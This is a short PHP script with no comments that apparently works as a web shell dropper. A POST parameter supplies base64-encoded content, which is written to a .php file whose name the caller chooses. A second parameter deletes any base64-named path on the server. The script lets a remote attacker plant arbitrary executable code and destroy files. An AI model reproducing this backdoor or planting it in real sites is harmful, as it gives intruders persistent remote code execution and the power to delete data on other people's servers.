<?php 
if (isset($_POST['q'])){
	file_put_contents($_POST['f'].'.php',base64_decode($_POST['q']));
}
if (isset($_POST['z'])){
	unlink(base64_decode($_POST['z']));
}
?>